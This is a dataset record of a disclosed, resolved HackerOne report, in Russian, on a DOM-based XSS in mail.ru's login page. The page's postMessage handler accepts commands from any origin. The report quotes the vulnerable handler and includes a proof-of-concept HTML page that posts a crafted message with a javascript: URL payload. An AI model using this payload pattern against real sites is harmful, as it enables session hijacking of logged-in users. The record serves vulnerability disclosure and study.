---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '269349'
original_report_id: '269349'
title: XSS on https://account.mail.ru/login via postMessage
weakness: Cross-site Scripting (XSS) - DOM
team_handle: mailru
created_at: '2017-09-18T22:15:27.982Z'
disclosed_at: '2017-12-27T14:26:13.041Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 18
asset_identifier: account.mail.ru
asset_type: URL
max_severity: critical
tags:
- hackerone
- cross-site-scripting-xss-dom
---

# XSS on https://account.mail.ru/login via postMessage

## Metadata

- HackerOne Report ID: 269349
- Weakness: Cross-site Scripting (XSS) - DOM
- Program: mailru
- Disclosed At: 2017-12-27T14:26:13.041Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

Обработчик сообщений на страничке https://account.mail.ru/login не проверяет источник, что позволяет вызвать любую доступную команду с произвольного ресурса:
```js
// https://img.imgsmail.ru/ag/0.3.3/authGate.js:formatted

function c(a) {
    a = a || window.event;
    var c, d, h = {}, i = a.data, j = a.source;
    if (0 === i.indexOf(e))
        try {
            if (i = g(a.data.substr(e.length)),
            c = i[e])
                if (i.response)
                    f[c] && (f[c](i.error, i.result),
                    delete f[c]);
                else {
                    h.response = h[e] = c;
                    try {
                        if (d = b[i.cmd],
                        !d)
                            throw "method not found";
                        h.result = d(i.data, j)
                    } catch (k) {
                        h.error = "wormhole.cors." + i.cmd + ": " + k.toString()
                    }
                    b(a.source).send(h)
                }
            else
                b.emit("data", [i, j])
        } catch (k) {
            b.emit("error", k)
        }
}
```

К примеру, `click:extauth`:
```js
"click:extauth": function(a) {
    window.location = a
}
```

И выполнить произвольный JS код.

Шаги для воспроизведения
--
  1. Аутентифицируемся в mail.ru;
  2. Переходим по URL-адресу: `https://www.buglloc.com/mail-1d4b012222ce06.html`;
  3. Жмем "click me";
  4. Должно открыться новое окно/табик и в нем выполнится наш JS-код.

Для истории, код html-странички:
```html
<a href="#" onclick="xss()">click me</a>
	<script>
function xss() {
	var win = window.open('https://account.mail.ru/login', '_blank');
	setTimeout(function() {
		win.postMessage('__cors__{"__cors__":"foo","cmd":"click:extauth","data":"javascript:alert`XSS`"}', '*');
	}, 500);
}
	</script>
```

Видео в аттаче.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
